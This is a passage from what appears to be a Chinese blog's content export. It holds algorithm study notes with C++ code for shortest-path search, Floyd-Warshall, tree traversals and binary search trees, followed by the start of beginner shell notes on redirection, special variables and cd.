class="comment">//第一个点</span></span><br><span class="line">        <span class="keyword">int</span> b = getIndex(inputStr[<span class="number">2</span>]);      <span class="comment">//第二个点</span></span><br><span class="line">        <span class="keyword">int</span> c = stoi(inputStr.substr(<span class="number">3</span>));   <span class="comment">//距离</span></span><br><span class="line">        <span class="comment">//赋值给距离矩阵</span></span><br><span class="line">        LOG_INFO(<span class="string">"%c--%c: %d"</span>, getChar(a), getChar(b), c);</span><br><span class="line">        distance[a][b] = c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">bool</span> change = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; ++i) &#123;</span><br><span class="line">            <span class="comment">//U集合中A点可到达的点i</span></span><br><span class="line">            <span class="keyword">if</span> (distance[<span class="number">0</span>][i] != <span class="number">-1</span>) &#123;</span><br><span class="line">                <span class="comment">//将路径加进去</span></span><br><span class="line">                <span class="keyword">if</span> (road.count(getChar(i)) == <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="built_in">string</span> roadStr = <span class="string">"A"</span>;</span><br><span class="line">                    road[getChar(i)] = roadStr + getChar(i);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">6</span>; ++j) &#123;</span><br><span class="line">                    <span class="comment">//筛选出i点可到达的j点</span></span><br><span class="line">                    <span class="keyword">if</span> (distance[i][j] != <span class="number">-1</span>) &#123;</span><br><span class="line">                        <span class="comment">//A点不可到达j点或者当前已计算的距离大于A从i到达j的距离</span></span><br><span class="line">                        <span class="keyword">if</span> (distance[<span class="number">0</span>][j] == <span class="number">-1</span> ||</span><br><span class="line">                            distance[<span class="number">0</span>][j] &gt; (distance[<span class="number">0</span>][i] + distance[i][j])) &#123;</span><br><span class="line">                            change = <span class="literal">true</span>;</span><br><span class="line">                            <span class="comment">//更新距离表</span></span><br><span class="line">                            distance[<span class="number">0</span>][j] = distance[<span class="number">0</span>][i] + distance[i][j];</span><br><span class="line">                            <span class="comment">//更新路径表</span></span><br><span class="line">                            <span class="built_in">string</span> tmpStr = road[getChar(i)];</span><br><span class="line">                            road[getChar(j)] = tmpStr + getChar(j);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//一轮没有改变则证明已经计算完毕</span></span><br><span class="line">        <span class="keyword">if</span> (!change) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">6</span>; ++j) &#123;</span><br><span class="line">            PRINT(<span class="string">"%d\t"</span>, distance[i][j]);</span><br><span class="line">        &#125;</span><br><span class="line">        PRINT(<span class="string">"\r\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//打印结果</span></span><br><span class="line">    PRINT(<span class="string">"\r\n"</span>);</span><br><span class="line">    LOG_INFO(<span class="string">"Result:"</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> m = <span class="number">0</span>; m &lt; <span class="number">6</span>; ++m) &#123;</span><br><span class="line">        LOG_INFO(<span class="string">"%c %s: %d"</span>, getChar(m), road[getChar(m)].c_str(), distance[<span class="number">0</span>][m]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Floyd算法"><a href="#Floyd算法" class="headerlink" title="Floyd算法"></a>Floyd算法</h3><p>Floyd-Warshall算法（Floyd-Warshall algorithm）是解决任意两点间的最短路径的一种算法，可以正确处理有向图或负权的最短路径问题，同时也被用于计算有向图的传递闭包。Floyd-Warshall算法的时间复杂度为O(N3)，空间复杂度为O(N2)。</p><h4 id="算法描述-1"><a href="#算法描述-1" class="headerlink" title="算法描述"></a>算法描述</h4><p>使用距离矩阵，从第一个顶点开始，计算所有两个点通过1点的路径是否是最短。然后再从第二个顶点开始，同样计算所有两个点的路径是否是最短，直到所有点计算完毕，得到的距离矩阵即为最短路径。</p><p>示例</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"log.hpp"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> InputFileName <span class="meta-string">"../input.txt"</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//按行返回数据</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">readFile</span><span class="params">(<span class="built_in">string</span> &amp;input)</span> </span>&#123;</span><br><span class="line">    input = <span class="string">""</span>;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> ifstream <span class="title">inFile</span><span class="params">(InputFileName)</span></span>;</span><br><span class="line">    <span class="keyword">if</span> (!inFile) &#123;</span><br><span class="line">        LOG_ERROR(<span class="string">"Failed to open file %s"</span>, InputFileName);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (!inFile.eof()) &#123;</span><br><span class="line">        <span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">        inFile.getline(buf, <span class="number">128</span>);</span><br><span class="line">        input = <span class="built_in">string</span>(buf);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//将字母转成数字</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getIndex</span><span class="params">(<span class="keyword">char</span> a)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (a) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'A'</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">'B'</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">'C'</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">'D'</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">'E'</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">'F'</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//将数字转成字母</span></span><br><span class="line"><span class="function"><span class="keyword">char</span> <span class="title">getChar</span><span class="params">(<span class="keyword">int</span> a)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (a) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'A'</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'B'</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'C'</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'D'</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'E'</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'F'</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">//由于已知点数量，第一行废掉</span></span><br><span class="line">    <span class="built_in">string</span> inputStr = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">if</span> (readFile(inputStr) != <span class="number">0</span>) &#123;</span><br><span class="line">        LOG_ERROR(<span class="string">"Read file error"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//定义距离矩阵</span></span><br><span class="line">    <span class="keyword">int</span> distance[<span class="number">6</span>][<span class="number">6</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">6</span>; ++j) &#123;</span><br><span class="line">            <span class="comment">//初始化所有距离为-1</span></span><br><span class="line">            distance[i][j] = <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//自己到自己为0</span></span><br><span class="line">        distance[i][i] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">map</span>&lt;<span class="built_in">string</span>, <span class="built_in">string</span>&gt; road;</span><br><span class="line">    <span class="keyword">while</span> (readFile(inputStr) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">int</span> a = getIndex(inputStr[<span class="number">0</span>]);      <span class="comment">//第一个点</span></span><br><span class="line">        <span class="keyword">int</span> b = getIndex(inputStr[<span class="number">2</span>]);      <span class="comment">//第二个点</span></span><br><span class="line">        <span class="keyword">int</span> c = stoi(inputStr.substr(<span class="number">3</span>));   <span class="comment">//距离</span></span><br><span class="line">        <span class="comment">//赋值给距离矩阵</span></span><br><span class="line">        LOG_INFO(<span class="string">"%c--%c: %d"</span>, getChar(a), getChar(b), c);</span><br><span class="line">        distance[a][b] = c;</span><br><span class="line">        <span class="comment">//添加到路由表</span></span><br><span class="line">        <span class="keyword">char</span> tmp[<span class="number">2</span>] = &#123;getChar(a), getChar(b)&#125;;</span><br><span class="line">        road[tmp] = <span class="built_in">string</span>(tmp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; <span class="number">6</span>; ++k) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; ++i) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">6</span>; ++j) &#123;</span><br><span class="line">                <span class="comment">//添加key</span></span><br><span class="line">                <span class="keyword">char</span> tmp[<span class="number">3</span>] = &#123;getChar(i), getChar(j), <span class="number">0x00</span>&#125;;</span><br><span class="line">                <span class="comment">//防止路径遗漏，补充路由表</span></span><br><span class="line">                <span class="keyword">if</span> (distance[i][j] != <span class="number">-1</span> &amp;&amp; road.count(tmp) == <span class="number">0</span>) &#123;</span><br><span class="line">                    road[tmp] = tmp;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//可通过k到达i且可通过k到达j</span></span><br><span class="line">                <span class="keyword">if</span> (distance[i][k] != <span class="number">-1</span> &amp;&amp; distance[k][j] != <span class="number">-1</span>) &#123;</span><br><span class="line">                    <span class="comment">//ij之间没有通路或者当前计算的最短路径大于通过k到达的距离</span></span><br><span class="line">                    <span class="keyword">if</span> (distance[i][j] == <span class="number">-1</span> ||</span><br><span class="line">                        distance[i][j] &gt; distance[i][k] + distance[k][j]) &#123;</span><br><span class="line">                        distance[i][j] = distance[i][k] + distance[k][j];</span><br><span class="line">                        <span class="comment">//更新路由表</span></span><br><span class="line">                        <span class="keyword">char</span> tmp1[<span class="number">3</span>] = &#123;getChar(i), getChar(k), <span class="number">0x00</span>&#125;;</span><br><span class="line">                        <span class="keyword">char</span> tmp2[<span class="number">3</span>] = &#123;getChar(k), getChar(j), <span class="number">0x00</span>&#125;;</span><br><span class="line">                        <span class="built_in">string</span> tmpRoad = road[tmp1];</span><br><span class="line">                        tmpRoad.pop_back();     <span class="comment">//防止重复字母</span></span><br><span class="line">                        road[tmp] = tmpRoad + road[tmp2];</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">6</span>; ++j) &#123;</span><br><span class="line">            PRINT(<span class="string">"%d\t"</span>, distance[i][j]);</span><br><span class="line">        &#125;</span><br><span class="line">        PRINT(<span class="string">"\r\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//打印结果</span></span><br><span class="line">    PRINT(<span class="string">"\r\n"</span>);</span><br><span class="line">    LOG_INFO(<span class="string">"Result:"</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> m = <span class="number">0</span>; m &lt; <span class="number">6</span>; ++m) &#123;</span><br><span class="line">        <span class="keyword">char</span> tmp[<span class="number">3</span>] = &#123;getChar(m), <span class="number">0x00</span>, <span class="number">0x00</span>&#125;;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; ++i) &#123;</span><br><span class="line">            tmp[<span class="number">1</span>] = getChar(i);</span><br><span class="line">            LOG_INFO(<span class="string">"%c-&gt;%c %s: %d"</span>, tmp[<span class="number">0</span>], tmp[<span class="number">1</span>], road[tmp].c_str(), distance[m][i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h1><h2 id="树"><a href="#树" class="headerlink" title="树"></a>树</h2><h3 id="遍历"><a href="#遍历" class="headerlink" title="遍历"></a>遍历</h3><h4 id="树的深度优先和广度优先遍历"><a href="#树的深度优先和广度优先遍历" class="headerlink" title="树的深度优先和广度优先遍历"></a><span id="treeSpan">树的深度优先和广度优先遍历</span></h4><p>定义树结构</p><img src="/2018/09/18/2018-09-18-algorithmStudy/2019_02_27_10.png" width="40%"><h5 id="深度优先遍历"><a href="#深度优先遍历" class="headerlink" title="深度优先遍历"></a>深度优先遍历</h5><p>深度优先遍历（Depth First Search），简称DFS，其原则是，沿着一条路径一直找到最深的那个节点，当没有子节点的时候，返回上一级节点，寻找其另外的子节点，继续向下遍历，没有就向上返回一级，直到所有的节点都被遍历到，每个节点只能访问一次。</p><h6 id="算法步骤："><a href="#算法步骤：" class="headerlink" title="算法步骤："></a>算法步骤：</h6><p>使用栈的数据结构实现</p><ol><li>首先将根节点1压入栈中【1】</li><li>将1节点弹出，找到1的两个子节点3，2，首先压入3节点，再压入2节点（后压入左节点的话，会先取出左节点，这样就保证了先遍历左节点），2节点再栈的顶部，最先出来【2，3】</li><li>弹出2节点，将2节点的两个子节点5，4压入【4，5，3】</li><li>弹出4节点，将4的子节点9，8压入【8，9，5，3】</li><li>弹出8，8没有子节点，不压入【9，5，3】</li><li>弹出9，9没有子节点，不压入【5，3】</li><li>弹出5，5有一个节点，压入10，【10，3】</li><li>弹出10，10没有节点，不压入【3】</li><li>弹出3，压入3的子节点7，6【6，7】</li><li>弹出6，没有子节点【7】</li><li>弹出7，没有子节点，栈为空【】，算法结束</li></ol><p>出栈顺序【1，2，4，8，9，5，10，3，6，7】</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//树结构</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> value;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="built_in">shared_ptr</span>&lt;Node&gt;&gt; pChild;</span><br><span class="line">    weak_ptr&lt;Node&gt; pParent;</span><br><span class="line">&#125; Node;</span><br><span class="line"></span><br><span class="line"><span class="comment">//深度优先打印节点</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printNodesDeepFirst</span><span class="params">(<span class="keyword">const</span> <span class="built_in">shared_ptr</span>&lt;Node&gt; &amp;node)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">stack</span>&lt;<span class="built_in">shared_ptr</span>&lt;Node&gt;&gt; myStack;</span><br><span class="line">    myStack.push(node);</span><br><span class="line">    <span class="keyword">while</span> (myStack.<span class="built_in">size</span>() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">shared_ptr</span>&lt;Node&gt; pTmp = myStack.top();</span><br><span class="line">        myStack.pop();</span><br><span class="line">        PRINT(<span class="string">"%d "</span>, pTmp-&gt;value);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//由于栈的后进先出特性，需要倒序使左节点先出</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = pTmp-&gt;pChild.<span class="built_in">size</span>(); i != <span class="number">0</span>; --i) &#123;</span><br><span class="line">            myStack.push(pTmp-&gt;pChild[i - <span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    PRINT(<span class="string">"\r\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="广度优先遍历"><a href="#广度优先遍历" class="headerlink" title="广度优先遍历"></a>广度优先遍历</h5><p>广度优先遍历（Breadth First Search），简称BFS；广度优先遍历的原则就是对每一层的节点依次访问，一层访问结束后，进入下一层，直到最后一个节点，同样的，每个节点都只访问一次。</p><h6 id="算法步骤：-1"><a href="#算法步骤：-1" class="headerlink" title="算法步骤："></a>算法步骤：</h6><p>使用队列的数据结构实现</p><ol><li>节点1，插入队列【1】</li><li>取出节点1，插入1的子节点2，3 ，节点2在队列的前端【2，3】</li><li>取出节点2，插入2的子节点4，5，节点3在队列的最前端【3，4，5】</li><li>取出节点3，插入3的子节点6，7，节点4在队列的最前端【4，5，6，7】</li><li>取出节点4，插入3的子节点8，9，节点5在队列的最前端【5，6，7，8，9】</li><li>取出节点5，插入5的子节点10，节点6在队列的最前端【6，7，8，9，10】</li><li>取出节点6，没有子节点，不插入，节点7在队列的最前端【7，8，9，10】</li><li>取出节点7，没有子节点，不插入，节点8在队列的最前端【8，9，10】</li><li>取出节点8，没有子节点，不插入，节点9在队列的最前端【9，10】</li><li>取出节点9，没有子节点，不插入，节点10在队列的最前端【10】</li><li>取出节点10，队列为空，算法结束</li></ol><p>我们看一下节点出队的顺序【1，2，3，4，5，6，7，8，9，10】</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//树结构</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> value;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="built_in">shared_ptr</span>&lt;Node&gt;&gt; pChild;</span><br><span class="line">    weak_ptr&lt;Node&gt; pParent;</span><br><span class="line">&#125; Node;</span><br><span class="line"></span><br><span class="line"><span class="comment">//广度优先打印节点</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printNodesWidthFirst</span><span class="params">(<span class="keyword">const</span> <span class="built_in">shared_ptr</span>&lt;Node&gt; &amp;node)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">queue</span>&lt;<span class="built_in">shared_ptr</span>&lt;Node&gt;&gt; myQueue;</span><br><span class="line">    myQueue.push(node);</span><br><span class="line">    <span class="keyword">while</span> (myQueue.<span class="built_in">size</span>() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">shared_ptr</span>&lt;Node&gt; pTmp = myQueue.front();</span><br><span class="line">        myQueue.pop();</span><br><span class="line">        PRINT(<span class="string">"%d "</span>, pTmp-&gt;value);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> tmp : pTmp-&gt;pChild) &#123;</span><br><span class="line">            myQueue.push(tmp);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    PRINT(<span class="string">"\r\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="二叉树前中后序遍历"><a href="#二叉树前中后序遍历" class="headerlink" title="二叉树前中后序遍历"></a><span id="towTree">二叉树前中后序遍历</span></h4><ul><li>前序遍历指先访问根，然后访问子树的遍历方式</li></ul><img src="/2018/09/18/2018-09-18-algorithmStudy/2019_02_22_05.png" width="40%"><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">in_order_traversal</span><span class="params">(TreeNode *root)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Do Something with root</span></span><br><span class="line">    <span class="keyword">if</span> (root-&gt;lchild != <span class="literal">NULL</span>)</span><br><span class="line">        in_order_traversal(root-&gt;lchild);</span><br><span class="line">    <span class="keyword">if</span> (root-&gt;rchild != <span class="literal">NULL</span>)</span><br><span class="line">        in_order_traversal(root-&gt;rchild);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>中序遍历指先访问左（右）子树，然后访问根，最后访问右（左）子树的遍历方式</li></ul><img src="/2018/09/18/2018-09-18-algorithmStudy/2019_02_22_06.png" width="40%"><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">in_order_traversal</span><span class="params">(TreeNode *root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (root-&gt;lchild != <span class="literal">NULL</span>)</span><br><span class="line">        in_order_traversal(root-&gt;lchild);</span><br><span class="line">    <span class="comment">// Do Something with root</span></span><br><span class="line">    <span class="keyword">if</span> (root-&gt;rchild != <span class="literal">NULL</span>)</span><br><span class="line">        in_order_traversal(root-&gt;rchild);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>后序遍历指先访问子树，然后访问根的遍历方式</li></ul><img src="/2018/09/18/2018-09-18-algorithmStudy/2019_02_22_07.png" width="40%"><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">in_order_traversal</span><span class="params">(TreeNode *root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (root-&gt;lchild != <span class="literal">NULL</span>)</span><br><span class="line">        in_order_traversal(root-&gt;lchild);</span><br><span class="line">    <span class="keyword">if</span> (root-&gt;rchild != <span class="literal">NULL</span>)</span><br><span class="line">        in_order_traversal(root-&gt;rchild);</span><br><span class="line">    <span class="comment">// Do Something with root</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="二叉搜索树"><a href="#二叉搜索树" class="headerlink" title="二叉搜索树"></a>二叉搜索树</h3><p>二叉查找树（Binary Search Tree），（又：二叉搜索树，二叉排序树）它或者是一棵空树，或者是具有下列性质的二叉树：<br><strong>若它的左子树不空，则左子树上所有结点的值均小于它的根结点的值； 若它的右子树不空，则右子树上所有结点的值均大于它的根结点的值；</strong><br>它的左、右子树也分别为二叉排序树。</p><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>二叉排序树的查找过程和次优二叉树类似，通常采取二叉链表作为二叉排序树的存储结构。<strong>中序遍历</strong>二叉排序树可得到一个关键字的有序序列，一个无序序列可以通过构造一棵二叉排序树变成一个有序序列，构造树的过程即为对无序序列进行排序的过程。每次插入的新的结点都是二叉排序树上新的叶子结点，在进行插入操作时，不必移动其它结点，只需改动某个结点的指针，由空变为非空即可。搜索,插入,删除的复杂度等于树高，O(log(n)).</p>]]></content>
      <categories>
        <category>Knowledge</category>
        <category>Study</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>shell学习笔记</title>
    <url>/2018/09/16/2018-09-16-shellStudy/</url>
    <content><![CDATA[<h1 id="目录特殊符号"><a href="#目录特殊符号" class="headerlink" title="目录特殊符号"></a>目录特殊符号</h1><ul><li>上一级 <code>..</code></li><li>当前目录 <code>.</code></li><li>当前用户目录 <code>~</code></li><li>根目录 <code>/</code></li></ul><h1 id="常用命令详解"><a href="#常用命令详解" class="headerlink" title="常用命令详解"></a>常用命令详解</h1><h2 id="gt-输出"><a href="#gt-输出" class="headerlink" title="&gt; 输出"></a>&gt; 输出</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ls ./ &gt;a.text           # 正确输出到a.txt(覆盖)</span><br><span class="line">ls ./ 1&gt;a.text          # 正确输出到a.txt(覆盖)</span><br><span class="line">ls ./ 2&gt;a.txt           # 错误输出到a.txt(覆盖)</span><br><span class="line">ls ./ 2&gt;a.txt           # 错误输出到a.txt(覆盖)</span><br><span class="line">ls ./ &gt;a.txt 2&gt;&amp;1       # 标准输出和标准错误输出到a.txt(覆盖)</span><br><span class="line">ls ./ &amp;&gt;a.txt           # 标准输出和标准错误输出到a.txt(覆盖)</span><br><span class="line"><span class="meta">#</span><span class="bash"> 追加使用&gt;&gt;</span></span><br><span class="line">ls ./ &gt;&gt;a.text          # 正确输出到a.txt(追加)</span><br></pre></td></tr></table></figure><h2 id="意义"><a href="#意义" class="headerlink" title="$ 意义"></a>$ 意义</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">$      <span class="comment"># Shell本身的PID（ProcessID）</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash">!      <span class="comment"># Shell最后运行的后台Process的PID</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash">UID    <span class="comment"># 当前用户的id</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash">PPID   <span class="comment"># 父进程id</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash">?      <span class="comment"># 最后运行的命令的结束代码（返回值）</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash">-      <span class="comment"># 使用Set命令设定的Flag一览</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash">*      <span class="comment"># 所有参数列表。如*所有参数列表。如"*“用「”」括起来的情况、以"$1 $2 … $n"的形式输出所有参数。</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash">@      <span class="comment"># 所有参数列表。如@所有参数列表。如"@“用「”」括起来的情况、以"$1 $2 … $n" 的形式输出所有参数。</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"><span class="comment">#      # 添加到Shell的参数个数</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash">0      <span class="comment"># Shell本身的文件名</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash">1～n   <span class="comment"># 添加到Shell的各参数值。$1是第1参数、$2是第2参数…</span></span></span><br></pre></td></tr></table></figure><h2 id="cd-跳转目录命令"><a href="#cd-跳转目录命令" class="headerlink" title="cd 跳转目录命令"></a>cd 跳转目录命令</h2><h3 id="特殊跳转"><a href="#特殊跳转" class="headerlink" title="特殊跳转"></a>特殊跳转</h3><ul><li>跳转上一级 <code>..</code></li><li>跳转当前目录 <code>.</code></li><li>跳转当前用户目录 <code>~</code></li><li>跳转根目录 